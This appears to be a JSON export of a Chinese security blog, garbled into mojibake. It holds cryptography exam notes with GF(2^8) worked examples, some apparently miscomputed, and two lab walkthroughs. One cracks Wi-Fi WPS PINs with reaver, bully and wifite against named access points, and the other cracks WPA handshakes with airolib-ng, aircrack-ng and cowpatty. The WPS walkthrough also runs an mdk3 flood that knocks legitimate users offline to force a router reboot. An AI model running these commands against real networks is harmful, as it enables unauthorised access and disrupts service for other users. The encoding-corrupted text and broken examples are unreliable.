ä»‹ç»æœ‰é™åŸŸä¸Šçš„æ¤­åœ†æ›²çº¿å’ŒåŸºäºæ¤­åœ†æ›²çº¿çš„å…¬é’¥å¯†ç ä½“åˆ¶ã€‚ç©ºã€‚åŸºæœ¬åŸç† è®¡ç®—ä¸Šä¸å¯è¡Œå³è¡¨ç¤ºä¸€ä¸ªç¨‹åºæ˜¯å¯å¤„ç†çš„ä½†æ˜¯éœ€è¦ä¸€ä¸ªé•¿å¾—ä¸åˆ‡å®é™…çš„æ—¶é—´(å¦‚å‡ åäº¿å¹´)æ¥å¤„ç†çš„æ­¥éª¤ã€‚å¹¶ä¸æ˜¯è®¡ç®—èµ·æ¥å¤æ‚æ€§å¾ˆé«˜ã€‚ ç›¸æ¯”å•å¯†é’¥ä½“åˆ¶ï¼Œå…¬é’¥å¯†ç ä½“åˆ¶è¿˜å¯ä»¥è§£å†³å¯†é’¥åˆ†é…å’Œæ•°å­—ç­¾åé—®é¢˜ å®‰å…¨SSLçš„æ•°å­—è¯ä¹¦RSAå…¬é’¥é•¿åº¦å·²è¾¾2048æ¯”ç‰¹ ä½æŒ‡æ•°æ”»å‡»ï¼Œeå¾ˆå°ï¼Œå¯ä»¥å¼€æ–¹æ¥è®¡ç®—ã€‚ä½†æ˜¯ï¼Œå¿…é¡»è¦æ¨¡è¾ƒå¤§çš„æ—¶å€™æ‰å¯ä»¥ï¼Œå¦‚æœå¤ªå°ï¼Œä¸èƒ½å¼€ï¼Œæ— æ³•è®¡ç®—å‡ºæ¥ ç¾¤è¿ç®—ä¸€å®šæ»¡è¶³ç»“åˆå¾‹ï¼Œä¸ä¸€å®šæ»¡è¶³äº¤æ¢å¾‹ ç¬¬äº”ç«  æ¶ˆæ¯è®¤è¯ç ä¸å“ˆå¸Œå‡½æ•° â» ç†è§£MACå’ŒHashå‡½æ•°çš„å®šä¹‰ä»¥åŠèƒ½è§£å†³çš„å®‰å…¨éœ€æ±‚ã€‚åŸºæœ¬ç‰¹å¾ã€‚MACçš„åŸºæœ¬åŸç†ã€‚ ç†è§£å“ˆå¸Œå‡½æ•°çš„ç”Ÿæ—¥æ”»å‡»ã€‚ç©ºï¼›å“ˆå¸Œçš„å®‰å…¨è®¾è®¡ç›®æ ‡ã€‚ç”Ÿæ—¥æ”»å‡»åŸç†ã€‚ ç†è§£HMACç®—æ³•åŸç†å’Œè®¾è®¡ç»“æ„ã€‚ç©ºï¼›å®‰å…¨è®¾è®¡è¦æ±‚ æŒæ¡MD5ç®—æ³•å’Œå®‰å…¨Hashç®—æ³•åŸç†çš„ç»“æ„ã€‚SHA-1å‚æ•°ç‰¹å¾ã€‚MD5å®‰å…¨æ€§ æ¶ˆæ¯è®¤è¯ç æ˜¯é’ˆå¯¹æ˜æ–‡çš„ï¼Œå¯ä»¥è®¤è¯æ˜æ–‡ï¼Œä¸æ˜¯é’ˆå¯¹å¯†æ–‡äº§ç”Ÿçš„ï¼Œæ‰€ä»¥ä¸èƒ½è®¤è¯å¯†æ–‡ã€‚ MD5è¾“å…¥é•¿åº¦æ²¡æœ‰é™åˆ¶ï¼ŒSHA-1é•¿åº¦ä¸è¶…è¿‡2^64 ä½ã€‚ï¼ˆæ˜¯é•¿åº¦ï¼Œä¸æ˜¯è½¬æ¢ä¸ºäºŒè¿›åˆ¶åçš„æ•°å€¼ï¼‰ MD5ï¼šç¼“å†²åŒº4ä¸ªå­—ï¼Œè¿›è¡Œ4è½®å¤„ç†ã€‚è¾“å…¥3ä¸ª32æ¯”ç‰¹çš„å­—ï¼Œè¾“å‡º1ä¸ªå­—ã€‚å°ç«¯æ–¹å¼å­˜å‚¨ SHA-1ï¼šç¼“å†²åŒº5ä¸ªå­—ï¼Œè¿›è¡Œ4è½®å¤„ç†ã€‚è¾“å…¥3ä¸ª32æ¯”ç‰¹çš„å­—ï¼Œè¾“å‡º1ä¸ªå­—ã€‚æ›´æ–°ä¹‹åè¿˜æ˜¯äº”ä¸ªå­—ã€‚å¤§ç«¯æ–¹å¼å­˜å‚¨ MD5å­˜å‚¨æŒ‰ç…§å°ç«¯æ–¹å¼ï¼Œè€ŒSHA-1æŒ‰ç…§å¤§ç«¯æ–¹å¼ã€‚ç†è®ºä¸Šï¼ŒSHA-1æ‰¾å¯»ç›¸åŒå“ˆå¸Œå€¼çš„ç¢°æ’æ¶ˆæ¯è®¡ç®—å¤æ‚åº¦ï¼Œå¤§æ¦‚2çš„80æ¬¡æ–¹ã€‚ ç¬¬å…­ç«  æ•°å­—ç­¾å â» æŒæ¡æ•°å­—ç­¾åçš„åŸºæœ¬æ¦‚å¿µå’Œç‰¹ç‚¹ã€‚æœ¬è´¨ç‰¹å¾ã€‚åŸºæœ¬ç®—æ³•ç»“æ„ã€‚ æŒæ¡RSAæ•°å­—ç­¾åä½“åˆ¶ã€‚æ˜¯å¦æ˜¯æ¦‚ç‡æ€§çš„ã€‚ç©ºï¼›ç©ºï¼›è®¡ç®—ï¼ŒéªŒè¯è¿‡ç¨‹ æ•°å­—ç­¾åçš„å¯†é’¥ç”Ÿæˆã€ç­¾åæ˜¯æ¦‚ç‡æ€§ç®—æ³•ï¼ˆéšæœºåŒ–ç®—æ³•ç”Ÿæˆvkã€skã€‚ç­¾åéšæœºåŒ–ç®—æ³•ç”Ÿæˆsignskï¼ˆmï¼‰&#x3D;è¥¿æ ¼ç›ï¼Œä½œä¸ºç­¾åï¼‰éªŒè¯æ˜¯ç¡®å®šæ€§ç®—æ³• RSAç­¾åæ˜¯ä¸€ç§ç¡®å®šæ€§ç­¾åã€‚å¦‚æœç”¨æ¶ˆæ¯å¡«å……çš„æ–¹å¼è¿›è¡ŒéšæœºåŒ–ï¼Œæœ¬è´¨ä¸Šæ˜¯å¯¹æ¶ˆæ¯çš„éšæœºåŒ–ã€‚ RSAç­¾åï¼Œä¸å†å­˜åœ¨å…±æ¨¡æ”»å‡»å’Œä½æŒ‡æ•°æ”»å‡»ã€‚ ç¬¬ä¸ƒç«  å¯†ç åè®® æŒæ¡diffie-Hellmanå¯†é’¥äº¤æ¢åŠä¸­é—´äººæ”»å‡»ã€‚æ”»å‡»çš„ç±»å‹ï¼›ç©ºï¼›ç©ºï¼›åŸç†ã€è¡¥ä¸ ç†è§£Kerberosç¬¬ä¸‰æ–¹è®¤è¯ç³»ç»ŸåŸç†ã€‚ç³»ç»Ÿç›®æ ‡ã€‚å¯é‡ç”¨æ€§ç‰¹ç‚¹ ç¬¬å…«ç«  å¯è¯æ˜å®‰å…¨ ä¸»è¦ä»‹ç»Boneh-FranklinåŸºäºèº«ä»½åŠ å¯†ç®—æ³•åŠå…¶å®‰å…¨æ€§è¯æ˜æ€è·¯ã€‚ç©ºï¼›ç‰¹ç‚¹ ç¬¬ä¹ç«  å¯†ç å­¦æ–°æ–¹å‘ å…¸å‹åŠ å¯†ç®—æ³•çš„åŠåŒæ€æ€§å’Œå…¨åŒæ€æ€§ã€‚ç©ºï¼›ç»å…¸ç®—æ³•çš„åŠåŒæ€æ€§ ç†è§£åé‡å­å¯†ç ç®—æ³•æŠµæŠ—é‡å­è®¡ç®—æ”»å‡»çš„åŸç†ã€‚ç©ºï¼›ç»å…¸ç®—æ³•å®‰å…¨æ€§å’Œæ–°ç®—æ³•ç‰¹ç‚¹ã€‚ ä¾‹é¢˜ xtimeç®—æ³•ç†è®ºåŸºç¡€ï¼š C(x)&#x3D;A(x)B(x) mod P(x) äºŒè¿›åˆ¶æ•°è½¬æ¢ä¸ºå¤šé¡¹å¼:A(a7,a6,a5,a4,a3,a2,a1,a0)&#x3D;&#x3D;&gt;A(X)&#x3D;a7x7+a6x6+a5x5+a4x4+a3x3+a2x2+a1x+a0ï¼ŒGF(28)å†…çš„æœ€å¤§å€¼ä¸º(11111111)2&#x3D;&#x3D;&gt; x7+x6+x5+x4+x3+x2+x+1ï¼ŒP(x)&#x3D;x8+x4+x3+x2+x+1&#x3D;&#x3D;&gt;(100011011)2&#x3D;0x11B X8 mod P(x)&#x3D; x4+x3+x2+x+1â€”â€”â€”â€”â€”â€”x8é™¤ä»¥P(x)çš„ä½™æ•° å¼‚æˆ–è¿ç®—ï¼š0âŠ•0&#x3D;0, 0âŠ•1&#x3D;1, 1âŠ•1&#x3D;0 æœ‰é™åŸŸGF(2n)åŠ æ³•ï¼šC(x)&#x3D;A(x)+B(x)&#x3D;âˆ‘cixi(0â‰¤iâ‰¤m-1)ï¼Œci&#x3D;ai+bi mod 2å³aiâŠ•biï¼ŒA(x)&#x3D;(am-1,â€¦,a3,a2,a1,a0)2ï¼ŒB(x)&#x3D;(bm-1,â€¦,b3,b2,b1,b0)2 å®šä¹‰xtime()è¿ç®—ï¼šè®¾A(x)âˆˆGF(28),A(x)&#x3D;a7x7+a6x6+a5x5+a4x4+a3x3+a2x2+a1x+a0å¯¹åº”çš„äºŒè¿›åˆ¶æ•°ä¸º(a7,a6,a5,a4,a3,a2,a1,a0)åˆ™xtime(A(x))&#x3D;xA(x)&#x3D; a7x8+a6x7+a5x6+a4x5+a3x4+a2x3+a1x2+a0xå¯¹åº”çš„äºŒè¿›åˆ¶æ•°ä¸º(a7,a6,a5,a4,a3,a2,a1,a0,0)ã€‚å°†A(x)å·¦ç§»ä¸€ä½(æœ€ä½ä½è¡¥0ï¼ŒåŸå…ˆçš„æœ€é«˜ä½åˆ é™¤)çš„ç»“æœä¸º(a6,a5,a4,a3,a2,a1,a0,0)ï¼Œå¦‚æœa7&#x3D;0ï¼Œåˆ™A(x)å·¦ç§»ä¸€ä½çš„ç»“æœå°±æ˜¯xtime(A(x))çš„å€¼ï¼›å¦‚æœa7&#x3D;1,åˆ™A(x)å·¦ç§»ä¸€ä½çš„ç»“æœä¸0x1Bé€æ¯”ç‰¹å¼‚æˆ–(å¼‚æˆ–è¿ç®—ç¬¦âŠ•)å³ä¸ºxtime(A(x))çš„å€¼ã€‚(a7&#x3D;1æ—¶ï¼Œx*A(x)çš„å€¼è¶…å‡ºGF(28)ï¼Œéœ€è¦ æ¨¡P(x),ç»“æœä¸ºA(x) å·¦ç§»ä¸€ä½çš„ç»“æœä¸º(a6,a5,a4,a3,a2,a1,a0,0)ä¸0x1Bé€æ¯”ç‰¹å¼‚æˆ–çš„å€¼) ä¾‹é¢˜ï¼š ä¾‹é¢˜1ï¼š è®¾0x64âˆˆGF(28)ï¼Œæ±‚xtime(0x64)çš„å€¼ï¼Ÿ 0x64è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°ä¸º(0110 0100)2ï¼Œæœ€é«˜ä½a7&#x3D;0,æ‰€ä»¥0x64å·¦ç§»ä¸€ä½çš„ç»“æœå°±æ˜¯æ‰€æ±‚å€¼ï¼Œ(0110 0100)2å·¦ç§»ä¸€ä½åçš„å€¼ä¸º(110 01000)2 ä¾‹é¢˜2ï¼š åœ¨GF(28)ä¸­è®¡ç®—0x570x13çš„ç»“æœï¼Ÿ å…ˆå°†166è¿›åˆ¶æ•°è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°ï¼š0x57&#x3D;(0101 0111)2,0x13&#x3D;(0001 0011)2 å°†äºŒè¿›åˆ¶æ•°è½¬æ¢ä¸ºå¤šé¡¹å¼ï¼š0x13&#x3D;x4+x+1 0x570x13&#x3D;0x57*(x4+x+1)&#x3D;0x57x4+0x57x+0x57 0x57xå°±æ˜¯xtime(0x57)&#x3D;(1010 1110)2 0x57x2å°±æ˜¯xtime(0x57x)&#x3D;(0101 1100)+(0001 1011)&#x3D;(0100 0111)2 åŒç†0x57x3&#x3D;(10001110)2,ï¼Œ0x57x4&#x3D;(0000 0111)2 æ‰€ä»¥0x570x13&#x3D;(00000111)2+(1010 1110)2+(0101 0111)2","categories":[{"name":"å¯†ç å­¦","slug":"å¯†ç å­¦","permalink":"https://gryffinbit.top/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/"}],"tags":[{"name":"è€ƒç‚¹","slug":"è€ƒç‚¹","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"WIFIå¯†ç ç ´è§£ä¹‹WPSåŠ å¯†","slug":"WIFIå¯†ç ç ´è§£ä¹‹WPSåŠ å¯†","date":"2021-05-05T12:54:21.000Z","updated":"2024-11-12T06:59:02.000Z","comments":true,"path":"2021/05/05/WIFIå¯†ç ç ´è§£ä¹‹WPSåŠ å¯†/","permalink":"https://gryffinbit.top/2021/05/05/WIFI%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E4%B9%8BWPS%E5%8A%A0%E5%AF%86/","excerpt":"","text":"â€‹ å®éªŒåŸç†ï¼šWPSï¼ˆWi-Fi Protected Setupï¼‰æ˜¯ç”±Wi-Fiè”ç›Ÿç»„ç»‡å®æ–½çš„å¯é€‰è®¤è¯é¡¹ç›®ï¼Œä¸»è¦æ˜¯ä¸ºäº†ç®€åŒ–æ— çº¿å±€åŸŸç½‘å®‰å…¨åŠå®‰å…¨æ€§èƒ½çš„é…ç½®å·¥ä½œã€‚ç”¨æˆ·åªéœ€è¦ç®€å•æŒ‰ä¸‹è·¯ç”±å™¨ä¸Šçš„WPSæŒ‰é’®æˆ–è€…è¾“å…¥PINç ï¼Œå³å¯å¿«é€Ÿè¿æ¥åˆ°Wi-Fiç½‘ç»œã€‚â€‹ WPS PINç å…±8ä½ï¼Œå…¶ä¸­ç¬¬8ä½æ˜¯æ ¡éªŒå’Œï¼Œæ‰€ä»¥åªéœ€è®¡ç®—å‡ºå‰7ä½å³å¯ã€‚åœ¨å®æ–½PINç ´è§£æ—¶ï¼Œå¯ä»¥åˆ†åˆ«åˆ¤æ–­PINçš„å‰å››ä½å’Œåä¸‰ä½æ˜¯å¦æ­£ç¡®ã€‚å› æ­¤ï¼ŒPINç åªæœ‰10^4+10^3&#x3D;11000ç§å˜åŒ–ã€‚â€‹ é‚£ä¹ˆåœ¨å®é™…ç ´è§£å°è¯•ä¸­ï¼Œæœ€å¤šåªéœ€è¯•éªŒ11000æ¬¡ï¼Œå¹³å‡åªéœ€è¯•éªŒ5500æ¬¡å°±èƒ½ç ´è§£ã€‚ reaver1. å¼€å¯æ— çº¿ç½‘å¡çš„ç›‘å¬æ¨¡å¼ 1airmon-ng start wlan0 2.ä½¿ç”¨washå·¥å…·æ‰«æå¼€å¯WPSçš„AP 1wash -i wlan0mon é€‰é¡¹ è¯´æ˜ BSSID AP çš„MACåœ°å€ Ch APçš„å·¥ä½œä¿¡é“ dBm æ¥æ”¶çš„ä¿¡å·å¼ºåº¦ WPS WPSçš„ç‰ˆæœ¬ Lck WPSæ˜¯å¦é”å®š Vendor ç”Ÿæˆå‚å•† ESSID APçš„SSID æŸ¥çœ‹æœ‰WPSåŠŸèƒ½çš„AP 1airodump-ng --wps wlan0mon 3. ä½¿ç”¨reaverå·¥å…·è¿›è¡Œç ´è§£ Reaveræ˜¯ä¸€æ¬¾æš´åŠ›ç ´è§£PINç çš„å·¥å…·ï¼Œå°†å°è¯•ä¸€ç³»åˆ—çš„PINç ï¼Œç›´åˆ°ç ´è§£å‡ºæ­£ç¡®çš„PINç ï¼Œè€Œä¸”è¿˜å¯ä»¥æ¢å¤å‡ºWPA&#x2F;WPA2å¯†ç ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1reaver -i [interface] -b [apçš„macåœ°å€] å¯ä»¥ä½¿ç”¨reaver --helpæŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚ å‚æ•°è¯´æ˜ï¼š é€‰é¡¹ è¯´æ˜ -i æŒ‡å®šç›‘å¬çš„æ— çº¿æ¥å£ -b æŒ‡å®šç›®æ ‡APçš„macåœ°å€ -S ä½¿ç”¨æœ€å°çš„DH keyï¼Œå¯ä»¥æé«˜ç ´è§£é€Ÿåº¦ -v ; -vv ; -q æ˜¾ç¤ºéä¸¥é‡è­¦å‘Š ; æ˜¾ç¤ºæ›´å¤šï¼Œ ç›¸å¯¹åº”çš„ ; åªæ˜¾ç¤ºå…³é”®ä¿¡æ¯ -d å³delayæ¯ç©·ä¸¾ä¸€æ¬¡çš„é—²ç½®æ—¶é—´ï¼Œé¢„è®¾ä¸º1ç§’ -c ä¿¡é“å·ç  -p ä½¿ç”¨æŒ‡å®šPINç çš„å››ä½æˆ–å…«ä½å¼€å§‹ç ´è§£ã€‚ 1reaver -i wlan0mon -b 18:D9:8F:66:CD:7C -v -S ä»¥â€œkongâ€ä½œä¸ºæ”»å‡»ç›®æ ‡ ä½¿ç”¨æŒ‡å®šPINç è¿›è¡Œç ´è§£ï¼Œä»¥â€œNetsec109_2â€ä½œä¸ºæ”»å‡»ç›®æ ‡ 1reaver -i wlan0mon -b 64:09:80:17:ED:2F -p 1234 -vv -S wifiteâ€‹ wifiteæ˜¯ä¸€æ¬¾è‡ªåŠ¨åŒ–WEPã€WPAå’Œ WPSç ´è§£å·¥å…·ã€‚ç”¨äºç ´è§£WPSåŠ å¯†çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1wifite --wps --wps-only --bully é€‰é¡¹ è¯´æ˜ â€“wps ä»…æ˜¾ç¤ºå¯ç”¨WPSåŠŸèƒ½çš„æ— çº¿ç½‘ç»œã€‚ â€“wps-only ä»…å®æ–½WPS PINå’ŒPixie-Dustæ”»å‡»ã€‚ â€“bully ä½¿ç”¨bullyç¨‹åºå®æ–½WPS PINå’ŒPixie-Dustæ”»å‡»ã€‚ â€“ignore-locks å½“APé”å®šåï¼Œç»§ç»­WPS PINæ”»å‡»ã€‚ 1wifite --wps --wps-only --bully --ignore-locks é€‰æ‹©ä¸€ä¸ªæƒ³è¦æ”»å‡»çš„ç¼–å· BullyBullyä¹Ÿæ˜¯ä¸€æ¬¾åˆ©ç”¨è·¯ç”±å™¨çš„WPSæ¼æ´æ¥ç ´è§£WIFIçš„å·¥å…·ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1bully --bssid [APçš„MACåœ°å€] -c [channel] [interface] -vv é€‰é¡¹ è¯´æ˜ interface æŒ‡å®šç›‘å¬çš„æ— çº¿æ¥å£ã€‚ -bï¼Œâ€“bssid æŒ‡å®šç›®æ ‡APçš„MACåœ°å€ã€‚ -cï¼Œâ€“channel æŒ‡å®šç›®æ ‡APå·¥ä½œçš„ä¿¡é“ã€‚ -vv æ˜¾ç¤ºæ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚ 1bully --bssid 18:D9:8F:66:CD:7C wlan0mon -c 11 ä»¥â€œkongâ€ä½œä¸ºæ”»å‡»ç›®æ ‡ é˜²æ­¢é”PINâ€‹ ç›®å‰ï¼Œå¤§éƒ¨åˆ†è·¯ç”±å™¨éƒ½è‡ªå¸¦é˜²PINåŠŸèƒ½ã€‚å½“ç©·ä¸¾PINç æš´åŠ›ç ´è§£æ—¶ï¼Œè¿ç»­ä½¿ç”¨è¶…è¿‡ç‰¹å®šæ¬¡æ•°çš„PINç åï¼Œè·¯ç”±å™¨ä¼šæš‚æ—¶é”å®šWPSåŠŸèƒ½ä¸€æ®µæ—¶é—´ã€‚è¿™ç§æƒ…å†µï¼Œéœ€è¦è€å¿ƒç­‰å¾…å…¶æ¢å¤WPSåŠŸèƒ½ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨mdk3å‘èµ·æ´ªæ°´æ”»å‡»ï¼Œä½¿å¾—è·¯ç”±å™¨åˆæ³•ç”¨æˆ·æ— æ³•ä½¿ç”¨ç½‘ç»œï¼Œä»è€Œè¿«ä½¿è·¯ç”±å™¨ä¸»äººé‡å¯è·¯ç”±å™¨ï¼Œå³å¯è§£é™¤PINé”ã€‚â€‹ APè®¤è¯æ´ªæ°´æ”»å‡»ï¼Œå°±æ˜¯å‘APå‘é€å¤§é‡è™šå‡çš„è¿æ¥è¯·æ±‚ã€‚å½“å‘é€çš„è¯·æ±‚è¶…è¿‡APæ‰€èƒ½æ‰¿å—çš„èŒƒå›´æ—¶ï¼ŒAPå°±ä¼šè‡ªåŠ¨æ–­å¼€ç°æœ‰è¿æ¥ï¼Œä½¿å¾—åˆæ³•ç”¨æˆ·æ— æ³•ä½¿ç”¨ç½‘ç»œã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1mdk3 &lt;interface&gt; a &lt;test_options&gt; é€‰é¡¹ è¯´æ˜ interface æŒ‡å®šç”¨äºæ”»å‡»çš„ç½‘ç»œæ¥å£ï¼Œéœ€æ˜¯ç›‘å¬æ¨¡å¼çš„æ¥å£ã€‚ a å®æ–½èº«ä»½éªŒè¯æ´ªæ°´æ”»å‡»æ¨¡å¼ã€‚ -a æŒ‡å®šè¦æ”»å‡»çš„ç›®æ ‡APçš„MACåœ°å€ã€‚ 1mdk3 wlan0mon a -a 18:D9:8F:66:CD:7C ä½¿ç”¨airodump-ngç›‘æµ‹ï¼Œå¯ä»¥çœ‹åˆ°ç•Œé¢ä¸‹æ–¹ç¬é—´å‡ºç°äº†å¤§é‡çš„ä¼ªé€ å®¢æˆ·ç«¯ï¼Œä¸”è¿æ¥çš„ç›®æ ‡APå‡ä¸ºâ€18:D9:8F:66:CD:7Câ€ã€‚ 1airodump-ng wlan0mon -c 11 --bssid 18:D9:8F:66:CD:7C","categories":[{"name":"å®éªŒ","slug":"å®éªŒ","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"ç‰©è”ç½‘","slug":"å®éªŒ/ç‰©è”ç½‘","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%89%A9%E8%81%94%E7%BD%91/"}],"tags":[{"name":"WPS","slug":"WPS","permalink":"https://gryffinbit.top/tags/WPS/"}],"author":"Gryffinbit"},{"title":"WPAæ¡æ‰‹åŒ…ç ´è§£åŸç†","slug":"WPAæ¡æ‰‹åŒ…ç ´è§£åŸç†","date":"2021-05-05T12:54:00.000Z","updated":"2024-11-12T06:58:46.000Z","comments":true,"path":"2021/05/05/WPAæ¡æ‰‹åŒ…ç ´è§£åŸç†/","permalink":"https://gryffinbit.top/2021/05/05/WPA%E6%8F%A1%E6%89%8B%E5%8C%85%E7%A0%B4%E8%A7%A3%E5%8E%9F%E7%90%86/","excerpt":"","text":"â€‹ å®éªŒåŸç†ï¼šWPAå¯†ç å…¶å®å«PSKï¼ˆpre-shared keyï¼‰ï¼Œå®ƒåŠ ä¸Šssidé€šè¿‡ä¸€å®šçš„ç®—æ³•å¯ä»¥å¾—åˆ°PMKï¼ˆpairwise master keyï¼‰: â€‹ $$ PMK&#x3D;SHA_1(ssid,psk) $$â€‹ PMKçš„é•¿åº¦æ˜¯å®šé•¿çš„ï¼Œéƒ½æ˜¯64å­—èŠ‚ã€‚ç”±äºè®¡ç®—PMKçš„è¿‡ç¨‹å¼€é”€æ¯”è¾ƒå¤§ï¼Œæ˜¯æˆ‘ä»¬ç ´è§£èŠ±è´¹æ—¶é—´é•¿çš„å…³é”®ï¼Œæ‰€ä»¥é‡‡ç”¨ä»¥ç©ºé—´æ¢æ—¶é—´çš„åŸåˆ™æŠŠPMKäº‹å…ˆç”Ÿæˆå¥½ï¼Œè¿™ä¸ªäº‹å…ˆç”Ÿæˆå¥½çš„è¡¨å°±æ˜¯å¸¸è¯´çš„HASHè¡¨ï¼Œè¿™ä¸ªå·¥ä½œå°±æ˜¯ç”¨airlib-ngè¿™ä¸ªå·¥å…·æ¥å®Œæˆã€‚â€‹ ç›®å‰çš„ç ´è§£æ–¹æ³•æ˜¯æˆ‘ä»¬è·å¾—æ¡æ‰‹åŒ…åï¼Œç”¨æˆ‘ä»¬å­—å…¸ä¸­çš„PSK+ssidç”ŸæˆPMKï¼Œç„¶åç»“åˆæ¡æ‰‹åŒ…ä¸­çš„ï¼ˆå®¢æˆ·ç«¯MACï¼ŒAPçš„BSSIDï¼Œ$A_NONCE$ï¼Œ$S_NONCE$ï¼‰è®¡ç®—PTKï¼Œå†åŠ ä¸ŠåŸå§‹çš„æŠ¥æ–‡æ•°æ®ç®—å‡ºMICå¹¶ä¸APå‘é€çš„MICæ¯”è¾ƒï¼Œå¦‚æœä¸€è‡´ï¼Œé‚£ä¹ˆè¯¥PSKå°±æ˜¯å¯†é’¥ã€‚ airolib-ngâ€‹ airolib-ngæ˜¯Aircrack-ngå¥—è£…é‡Œçš„åˆä¸€ä¸ªå·¥å…·ï¼Œç”¨æ¥å­˜å‚¨å’Œå¤„ç†ç½‘ç»œåå’Œå¯†ç è¡¨ã€‚é€šè¿‡è®¡ç®—PMKï¼Œç”¨äºWPA&#x2F;WPA2çš„ç ´è§£ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1airolib &lt;database&gt; &lt;operation&gt; [options] é€‰é¡¹ è¯´æ˜ database è¡¨ç¤ºæ•°æ®åº“æ–‡ä»¶ï¼Œå¯ä»¥æ˜¯ç»å¯¹è·¯å¾„ã€‚ operation æŒ‡å®šäº†æˆ‘ä»¬è¦å¯¹æ•°æ®åº“è¿›è¡Œçš„æ“ä½œã€‚ â€“import {essid|passwd} {file} å¯¼å…¥å«æœ‰ç½‘ç»œåæˆ–è€…ç§˜é’¥åˆ—è¡¨çš„æ–‡æœ¬æ–‡ä»¶ã€‚æ–‡ä»¶æ¯è¡Œéœ€å«ä¸€ä¸ªç½‘ç»œåæˆ–è€…å¯†ç ï¼Œä»¥æ¢è¡Œç¬¦ç»“æŸï¼ˆè¿™æ ·è¯»å…¥æ—¶å°±ä¼šè¢«å½“åšâ€œenterâ€ï¼‰ã€‚ â€“batch å¼€å§‹è®¡ç®—æ‰€æœ‰ç½‘ç»œåå’Œå¯†ç çš„ç»„åˆã€‚æ­¤å‘½ä»¤éœ€ç”¨åœ¨aircrack-ngç ´è§£ä¹‹å‰ã€‚å½“æ•°æ®åº“æ·»åŠ äº†æ–°çš„SSIDæˆ–è€…å¯†ç æ—¶ï¼Œä¹Ÿè®¸é‡æ–°è®¡ç®—ã€‚ â€“export cowpatty [essid] [file] å¯¼å‡ºä¸ºcowpattyæ–‡ä»¶ã€‚ â€“sql {sql} æ‰§è¡Œæ‰€ç»™çš„SQLè¯­å¥ã€‚ airolib-ng â€“help æŸ¥çœ‹å¸®åŠ©æ–‡æ¡£ã€‚ 1.åˆ›å»ºåŒ…å«ESSIDçš„æ–‡æ¡£ åˆ›å»ºåŒ…å«ESSIDçš„æ–‡æ¡£ï¼Œæ¯è¡Œå«æœ‰ä¸€ä¸ªESSIDã€‚åˆ›å»ºåç§°ä¸ºgryffinbitï¼ˆåç§°è‡ªå–ï¼‰çš„æ•°æ®åº“ï¼Œå‘æ•°æ®åº“æ’å…¥ESSIDã€‚ 1airolib-ng gryffinbit --import essid /root/ssid.txt 2.åˆ›å»ºåŒ…å«å¯†ç çš„æ–‡æ¡£ï¼Œå¹¶å‘rainbowæ•°æ®åº“æ’å…¥å¯†ç ã€‚ 1airolib-ng gryffinbit --import password /root/password.txt 3.æ‰¹é‡ç”Ÿäº§PMKæ•°æ®ã€‚ 1airolib-ng gryffinbit --batch æŸ¥çœ‹æ•°æ®çš„çŠ¶æ€ 1airolib-ng gryffinbit --stats å¯ä»¥çœ‹åˆ°ï¼Œå½“å‰æ•°æ®åº“ä¸­æœ‰11ä¸ªESSIDå’Œ16ä¸ªå¯†ç ï¼Œå¹¶ä¸”å·²æˆåŠŸå¯¹å…¶è¿›è¡Œäº†è®¡ç®—ã€‚ 4.ä½¿ç”¨aircrack-ngè¿›è¡Œç ´è§£ 1aircrack-ng -r gryffinbit -e helloworld handshake-01.cap é€‰é¡¹ è¯´æ˜ -r æŒ‡å®šPMKæ•°æ®åº“ -e æŒ‡å®šESSID â€‹ ä¹Ÿå¯ä»¥é€‰æ‹©ä½¿ç”¨Cowpattyå·¥å…·è¿›è¡Œç ´è§£ã€‚Cowpattyæ˜¯ä¸€æ¬¾Linuxä¸‹ç”¨äºç ´è§£WPA-PSKåŠ å¯†çš„å·¥å…·ã€‚å…¶è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š 1cowpatty [options] é€‰é¡¹ è¯´æ˜ -d Hashè¡¨ -r å«æœ‰æ¡æ‰‹åŒ…çš„capæ–‡ä»¶ -s APçš„ESSID åœ¨ä½¿ç”¨Cowpattyä¹‹å‰ï¼Œéœ€è¦å…ˆæå–ç”¨äºcowpattyè·‘çš„hash è¡¨ã€‚ 1airolib-ng gryffinbit --export cowpatty helloworld R_table ç„¶åå°±å¯ä»¥ä½¿ç”¨Cowpattyå·¥å…·ã€‚ 1cowpatty -s kong -d R_table -r .cap â€‹ â€‹ ä½¿ç”¨airolib-ngç”ŸæˆPMKæ•°æ®åï¼Œå¯ä»¥å¯¹è¯¥æ•°æ®è¿›è¡Œç®¡ç†ï¼Œæ¯”å¦‚å¯¼å…¥ç¬¬ä¸‰æ–¹æ•°æ®ã€æ ¡éªŒæ•°æ®å’Œæ¸…ç†æ•°æ®ã€‚å¯¼å…¥ssidlist.txt æ–‡ä»¶ä¸­çš„ESSIDåˆ°æ•°æ®åº“ã€‚ 1airolib-ng gryffinbit --import password /root/password.txt å¯¼å…¥pword.txt æ–‡ä»¶ä¸­çš„å¯†ç åˆ°æ•°æ®åº“ã€‚ 1airolib-ng gryffinbit --import essid /root/ssidlist.txt ä½¿ç”¨â€“verifyé€‰é¡¹æ ¡éªŒæ•°æ®ï¼Œä»¥éªŒè¯æ•°æ®åº“çš„çŠ¶æ€æ­£å¸¸ã€‚ä¹Ÿå¯ä»¥ä½¿ç”¨â€“cleané€‰é¡¹è¿›è¡Œæ•°æ®æ¸…ç†ã€‚ 1airolib-ng gryffinbit --verify 